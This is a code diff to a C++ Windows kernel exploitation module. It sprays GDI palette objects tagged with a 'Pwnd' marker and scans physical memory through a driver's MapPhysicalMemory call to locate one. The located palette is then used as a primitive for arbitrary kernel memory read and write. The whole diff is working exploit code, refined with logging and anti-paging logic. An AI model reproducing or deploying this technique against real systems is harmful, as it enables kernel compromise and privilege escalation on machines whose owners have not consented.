@@ -1,11 +1,12 @@
 #include "KernelPrimitives.h"
 
 #include <iostream>
+#include <sstream>
 #include <exception>
 
 constexpr size_t NUMBER_OF_PALETTES = 0x3000;
-constexpr size_t PAGE_SIZE = 0x1000;
-constexpr size_t ALLOCATION_SIZE = PAGE_SIZE + FIELD_OFFSET(PALETTE64, apalColors);
+constexpr size_t BUFFER_SIZE = 0x10000;
+constexpr size_t ALLOCATION_SIZE = BUFFER_SIZE + FIELD_OFFSET(PALETTE64, apalColors);
 constexpr PALETTEENTRY PALETTE_IDENTIFIER = { 'P', 'w', 'n', 'd' };
 
 bool operator==(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
@@ -16,60 +17,89 @@ bool operator!=(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
 	return !(First == Second);
 }
 
-struct LOGPALETTE2 : LOGPALETTE {
-	PALETTEENTRY SecondEntry;
+constexpr ULONG NUMBER_OF_ID_ENTRIES = 0x10;
+
+template <ULONG N>
+struct LOGPALETTEN : LOGPALETTE {
+	PALETTEENTRY apalColor[N - 1];
 };
 
 /*
 	Checks if a pointer is pointing at a palette, return its index if it is, otherwise return -1
 */
+template <ULONG N>
 UINT32 GetPaletteIndexFromPointer(const PBYTE Pointer, DWORD Tid) {
-	if (*reinterpret_cast<const PALETTEENTRY*>(Pointer) != PALETTE_IDENTIFIER) return false;
-	// assume it's pointing at a palette, let's make some extra checks, to be certain
-	const auto* palette = reinterpret_cast<const PALETTE64*>(Pointer - FIELD_OFFSET(PALETTE64, apalColors));
-	if (palette->cEntries == 2 && palette->BaseObject.Tid == Tid) {
-		return *reinterpret_cast<const UINT32*>(&palette->apalColors[1]);
-	} 
-	return -1;
+	const auto* entryPointer = (UINT32*)Pointer;
+	for (auto i = 0; i < N; ++i) {
+		if (*entryPointer++ != *(UINT32*)&PALETTE_IDENTIFIER) return -1;
+	}
+	auto id = *((const UINT32*)entryPointer);
+	if (id >= NUMBER_OF_PALETTES)
+		return -1;
+
+	OutputDebugStringA("Found candidate palette pointer\n");
+	return id;
+	// assume it's pointing at a palette, let's make some extra checks, to be certai
+	//const auto* palette = reinterpret_cast<const PALETTE64*>(Pointer - FIELD_OFFSET(PALETTE64, apalColors));
+	//if (palette->cEntries == 3 && palette->apalColors[1] == PALETTE_IDENTIFIER) {
+	//	return *reinterpret_cast<const UINT32*>(&palette->apalColors[2]);
+	//} 	
 }
 
 VOID KernelReadWrite::SprayPalettes(std::vector<HPALETTE>& Palettes) {
-	LOGPALETTE2 palette{};
+	LOGPALETTEN<NUMBER_OF_ID_ENTRIES + 2> palette{};
 	palette.palVersion = 0x300;
-	palette.palNumEntries = 2;
-	palette.palPalEntry[0] = PALETTE_IDENTIFIER;
-
-	for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
-		palette.palPalEntry[1] = *reinterpret_cast<PALETTEENTRY*>(&i);
-		Palettes[i] = CreatePalette(&palette);
+	palette.palNumEntries = NUMBER_OF_ID_ENTRIES + 1;
+	for (auto i = 0; i < NUMBER_OF_ID_ENTRIES; ++i) {
+		palette.apalColor[i] = PALETTE_IDENTIFIER;
 	}
+
+	LOGGER.info("Starting to spray palettes");
+	for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
+		palette.apalColor[NUMBER_OF_ID_ENTRIES] = *reinterpret_cast<PALETTEENTRY*>(&i);
+		Palettes.push_back(CreatePalette(&palette));
+		if (i % 0x100 == 0) {
+			LOGGER.debug("SprayPalettes: [", i / 0x100, ":", NUMBER_OF_PALETTES / 0x100, "]");
+		}
+	}
+	LOGGER.info("Finished spraying palettes");
 }
+
+constexpr ULONG ACCESS_INTERVAL = 100;
 
 /*
 	Finds a palette in-memory and saves a virtual-memory mapping to it, and its handle.
 */
 VOID KernelReadWrite::FindMappedPalette(const std::vector<HPALETTE>& Palettes) {
 	ULONG_PTR currentPhysicalAddress = 0;
-	PBYTE mappedPaged = nullptr;
+	PBYTE mappedPage = nullptr;
 	auto tid = GetCurrentThreadId();
-	while ((mappedPaged =
+	auto numberOfPages = 0;
+	while ((mappedPage =
 		reinterpret_cast<PBYTE>(this->driver.MapPhysicalMemory(ALLOCATION_SIZE, currentPhysicalAddress))) != nullptr) {
 		auto paletteIndex = 0;
 
 		for (auto i = FIELD_OFFSET(PALETTE64, apalColors); i < ALLOCATION_SIZE - sizeof(PALETTEENTRY); ++i) {
-			if ((paletteIndex = GetPaletteIndexFromPointer(mappedPaged + i, tid)) != -1) {
+			paletteIndex = GetPaletteIndexFromPointer<NUMBER_OF_ID_ENTRIES>(mappedPage + i, tid);
+			if (paletteIndex != -1) {
 				// found a palette
-				this->foundPaletteAddress = reinterpret_cast<PALETTE64*>(mappedPaged + i - FIELD_OFFSET(PALETTE64, apalColors));
+				this->foundPaletteAddress = reinterpret_cast<PALETTE64*>(mappedPage + i - FIELD_OFFSET(PALETTE64, apalColors) - sizeof(PALETTEENTRY));
 				this->foundPaletteHandle = Palettes[paletteIndex];
-				std::cout << "Found palette at index " << paletteIndex << std::endl;
+				
+				LOGGER.info("Found palette at index ", paletteIndex, " with address ", std::hex, this->foundPaletteAddress);
 				break;
 			}
 		}
 		if (this->foundPaletteAddress)
 			break;
 
-		this->driver.UnmapPhysicalMemory(currentPhysicalAddress);
-		currentPhysicalAddress += PAGE_SIZE;
+		if (numberOfPages % ACCESS_INTERVAL == 0) {
+			LOGGER.debug("Accessing all palettes for the ", numberOfPages / ACCESS_INTERVAL, "th time");
+			this->AccessAllPalettes(Palettes); // make sure it's not paged out
+		}
+		++numberOfPages;
+		this->driver.UnmapPhysicalMemory(mappedPage);
+		currentPhysicalAddress += BUFFER_SIZE;
 	}
 }
 
@@ -90,6 +120,9 @@ KernelReadWrite::KernelReadWrite(const std::string& DriverPath) : driver(DriverP
 	this->FindMappedPalette(palettes);
 	std::cout << "Found mapped palette, handle " << std::hex << \
 		this->foundPaletteHandle << " Mapped address " << this->foundPaletteAddress << std::endl;
+	if (this->foundPaletteAddress == nullptr) {
+		throw std::runtime_error("Failed to find palette");
+	}
 	// step 3: cleanup the rest
 	this->FreeOtherPalettes(std::move(palettes));
 	std::cout << "Freed other palettes\n";
@@ -112,4 +145,11 @@ VOID KernelReadWrite::WriteQword(ULONG64 Value, PVOID Address) {
 		throw std::exception("Failed to write to address");
 	}
 	std::cout << "Written to " << std::hex << Address << "value " << Value << std::endl;
+}
+
+VOID KernelReadWrite::AccessAllPalettes(const std::vector<HPALETTE>& Palettes) const {
+	PALETTEENTRY temp = { 0 };
+	for (auto palette : Palettes) {
+		GetPaletteEntries(palette, 0, 1, &temp);
+	}
 }
